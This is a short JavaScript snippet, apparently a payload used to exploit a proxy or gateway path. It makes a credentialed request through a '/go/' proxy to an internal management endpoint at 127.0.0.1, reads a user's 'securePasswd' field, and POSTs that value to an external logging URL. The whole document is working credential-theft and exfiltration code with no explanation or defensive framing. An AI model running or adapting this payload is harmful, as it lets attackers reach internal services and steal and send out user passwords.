(async () => {
  try {
    const response = await fetch("https://10.210.34.88/go/http://127.0.0.1:12345/management/users/1", {
      credentials: "include" 
    });

    const json = await response.json();
    const passwdValue = json.securePasswd;
    
    await fetch("https://10.210.34.88/go/https://sonicwall.com/log", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        data: passwdValue,
        timestamp: Date.now()
      })
    });

  } catch (err) {
    console.error("Hata:", err);
  }
})();
